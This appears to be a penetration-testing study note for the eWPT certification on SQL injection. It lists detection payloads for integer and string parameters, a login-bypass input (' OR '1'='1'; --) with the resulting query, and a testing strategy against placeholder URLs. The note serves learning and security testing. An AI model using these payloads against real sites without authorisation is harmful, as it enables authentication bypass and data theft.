2025-07-24 06:56

Status:

Tags: [[eWPT]] [[SQL Injection]]
###### Prerequisites: 
# SQL Injection Testing

## Overview

**SQL Injection (SQLi)** occurs when user input is improperly handled, allowing an attacker to manipulate SQL queries executed by the application.

To test for SQL injection:

- Use string terminators like `'` and `"`
    
- Try SQL commands like `SELECT`, `UNION`, `UPDATE`
    
- Use SQL comments: `--` or `#`
    
- Determine the **input type**: Is it **integer-based** or **string-based**?
    

> Always test **one payload at a time** to identify the successful injection point.

---

## Integer-Based SQL Injection

### Scenario

Some parameters are treated as integers in the SQL query.

**Example URL:**

```
http://site.com/user.php?id=1
```

**Underlying SQL Query:**

```sql
SELECT * FROM Users WHERE id = 1;
```

### Technique

Use **boolean logic** and **mathematical expressions** to identify injection points.

### Payload Examples

|Payload|Explanation|Result if Vulnerable|
|---|---|---|
|`AND 1`|Adds a true condition|Page loads normally|
|`AND 0`|Adds a false condition|Blank or error page|
|`1-1`|Evaluates to 0|If visible in output, likely vulnerable|
|`1*56`|Mathematical test|56 appears if vulnerable|

### Full Example Test

**Injected URL:**

```
http://site.com/user.php?id=1 AND 1=1
```

If the page loads **normally**, test with:

```
http://site.com/user.php?id=1 AND 1=2
```

If the second returns a **blank or error page**, the input is injectable.

---

## String-Based SQL Injection

### Scenario

Some inputs are treated as **strings** in SQL queries.

**Example URL:**

```
http://site.com/user.php?id=alexis
```

**Underlying SQL Query:**

```sql
SELECT * FROM Users WHERE name = 'alexis';
```

### Technique

Inject special string characters (`'` or `"`) to close the string and manipulate the query.

### Payload Examples

|Payload|Explanation|Result if Vulnerable|
|---|---|---|
|`'`|Breaks the query|SQL syntax error|
|`''`|Valid empty string|May return empty user|
|`' OR 1=1--`|Always true condition|Returns all users|
|`' AND 1=2--`|Always false condition|Blank or error page|

---

## Exploiting the Single Quote (`'`)

### Why It's Effective

In SQL, `'` is used to **enclose string literals**. If not properly escaped, it allows the attacker to:

- **Close** the current string
    
- **Inject custom SQL**
    
- **Comment out** the rest of the query
    

---

### Login Bypass Example

**Original SQL Query:**

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>';
```

**Malicious Input:**

- **Username:** `' OR '1'='1'; --`
    
- **Password:** (left blank)
    

**Modified SQL Query:**

```sql
SELECT * FROM users WHERE username = '' OR '1'='1'; -- ' AND password = '';
```

- `'` closes the original string.
    
- `OR '1'='1'` is always true.
    
- `--` comments out the rest of the SQL query (including password check).
    

### Result

- Authentication is **bypassed**.
    
- Attacker is **logged in** without valid credentials.
    

---

## Testing Strategy

1. **Identify the input type**: Integer or String.
    
2. **Use simple payloads** to test behavior:
    
    - Integer: `1 AND 1=1`, `1 AND 1=2`
        
    - String: `'`, `' OR '1'='1`
        
3. **Check for SQL errors** or **changes in output**.
    
4. **Use boolean logic** or **math operations** to confirm vulnerability.
    
5. **Explore further** using UNION SELECT, time-based, or blind techniques.
    

---

## Summary Table

|Type|Test Input|Expected Behavior|
|---|---|---|
|Integer|`?id=1 AND 1=1`|Normal page|
|Integer|`?id=1 AND 1=2`|Error or blank|
|String|`?name='`|SQL error|
|String|`?name=' OR '1'='1'--`|Auth bypass or data dump|

---

Let me know if you want to expand this note with:

- **Blind SQLi**
    
- **Time-based payloads**
    
- **UNION-based exploitation**
    
- **Bypassing filters and WAFs**
    
- **Tool-based testing (sqlmap, etc.)**